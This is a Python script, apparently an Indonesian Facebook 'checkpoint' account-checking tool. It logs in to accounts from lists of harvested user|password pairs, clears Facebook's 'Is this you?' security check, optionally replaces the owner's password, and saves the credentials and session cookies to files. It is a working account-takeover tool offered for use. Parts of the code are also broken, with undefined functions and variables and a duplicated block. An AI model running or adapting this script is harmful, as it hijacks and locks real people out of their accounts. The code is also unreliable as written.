#------------------[ METHODE-MBASIC-2 ]-------------------#
def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s \033[0mcookie invalid"%(M))

import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()
	
current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m└─ "


def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)


ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	clear()
	banner()
	dirs = os.listdir('CP')
	cetak(nel(f"[bold white] PILIH FILE CP YANG MAU DI CEK",width=79,style="green"))
	for file in dirs:
		cetak(nel(f"%s%s\033[0m%s"%(U,til,file),width=79,style="green"));jeda(0.07)
	try:
		print("\n%s%s%s\033[0m Masukan file [ cth%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s \033[0mfile tidak ada'%(M,til))
		exit()
		
def opsi():
	CP = ("CP/")
	romi = input("%s%s%s \033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s \033[0misi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s \033[0mnama file %s\033[0m tidak tersedia"%(M,til,romi))
	jalan("%s%s%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(U,til,O))
	pw=input("\n%s%s%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s \033[0mmasukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s sandi minimal 6 karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	##cetak(nel("\n %s# %s----------------------------------------"width=79,style="yellow");jeda(2)
	cetak(nel("%s%s%s\033[0m total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))),width=79,style="green"))
	#print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
				continue
	print("\n%s%s%s \033[0mSelesai mengecek akun"%(U,til,O));jeda(0.07)
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = 'Mozilla/5.0 (Linux; Android 10; SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5634.221 Mobile Safari/537.36'
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s╰─%s \033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n╰─ OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> Alvino_Adijaya_Xy <<<<<#
